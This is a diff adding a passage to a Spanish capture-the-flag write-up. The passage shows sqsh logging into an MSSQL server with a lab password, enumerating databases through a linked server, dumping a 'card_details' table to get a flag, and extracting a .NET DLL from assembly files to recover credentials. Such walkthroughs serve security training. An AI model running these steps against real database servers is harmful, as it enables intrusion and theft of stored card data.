@@ -306,4 +306,67 @@ Si probamos conectarnos con `sqsh` a `mssql` con las credenciales, nos podemos c
 
 ```
 ❯ sqsh -S 10.13.37.12:1433 -U teignton\\karl.memaybe -P 'B6rQx_d&RVqvcv2A'
+Copyright (C) 1995-2001 Scott C. Gray
+1>
 ```
+
+Si enumeramos un poco podemos ver la `base de datos clients`:
+
+```
+1> select * from openquery("web\clients", 'select name from master..sysdatabases');
+2> go
+master
+tempdb
+model
+msdb
+clients
+(5 rows affected)
+1>
+```
+
+Seguimos enumerando la base de datos y encontramos `card_details`:
+
+```
+1> select * from openquery("web\clients", 'select name from clients..sysobjects');
+2> go
+BackupClients
+card_details
+QueryNotificationErrorsQueue
+queue_messages_1977058079
+EventNotificationErrorsQueue
+queue_messages_2009058193
+ServiceBrokerQueue
+queue_messages_2041058307
+(8 rows affected)
+1>
+```
+
+Si enviamos su contenido a un txt y despues lo cateamos podemos ver la FLAG: `CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}`
+
+```
+1> select * from openquery("web\clients", 'select * from clients..card_details');
+2> go > out.txt
+1> exit
+❯ cat out.txt | grep CONTEXT
+CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}
+```
+
+También encontramos un `binario` que despues de bajarlo podemos ver que es un `dll`.
+
+```
+1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
+2> go > text
+1> exit
+❯ cat text | base64 -d > out
+❯ file out
+out: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+Revisando con ayuda de `dnSpy` las funciones podemos ver `BackupClients`:
+
+![](/assets/images/writeup-context/dnSpy1.PNG)
+
+Dentro podemos ver `credenciales` entonces simplemente nos conectamos:
+
+![](/assets/images/writeup-context/dnSpy2.PNG)
+
